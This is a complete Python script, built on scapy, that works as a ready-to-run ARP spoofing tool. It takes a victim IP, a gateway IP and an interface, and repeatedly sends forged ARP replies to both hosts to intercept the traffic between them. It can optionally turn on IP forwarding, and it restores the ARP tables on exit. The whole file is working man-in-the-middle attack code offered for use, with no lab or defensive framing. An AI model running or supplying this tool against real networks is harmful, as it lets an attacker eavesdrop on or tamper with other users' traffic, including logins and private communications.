import argparse
import time
import sys
import scapy.all as scapy

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc if answered_list else None

def spoof(target_ip, spoof_ip, iface):
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[-] Could not get MAC for {target_ip}")
        return
    packet = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.sendp(packet, verbose=False, iface=iface)

def restore(target_ip, source_ip, iface):
    target_mac = get_mac(target_ip)
    source_mac = get_mac(source_ip)
    if target_mac and source_mac:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False, iface=iface)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARP Spoofing Tool")
    parser.add_argument("victim_ip", help="Victim IP")
    parser.add_argument("gateway_ip", help="Gateway IP")
    parser.add_argument("interface", help="Network interface (e.g., eth0)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose mode")
    parser.add_argument("--forward", action="store_true", help="Enable IP forwarding")
    args = parser.parse_args()

    if args.forward:
        print("[+] Enabling IP forwarding")
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")

    sent_packets_count = 0
    try:
        print("[+] Starting ARP spoofing. Ctrl+C to stop.")
        while True:
            spoof(args.victim_ip, args.gateway_ip, args.interface)
            spoof(args.gateway_ip, args.victim_ip, args.interface)
            sent_packets_count += 2
            if args.verbose:
                print(f"[+] Packets sent: {sent_packets_count}")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[-] Stopping. Restoring ARP tables...")
        restore(args.victim_ip, args.gateway_ip, args.interface)
        restore(args.gateway_ip, args.victim_ip, args.interface)
        if args.forward:
            print("[+] Disabling IP forwarding")
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("0")
        sys.exit(0)
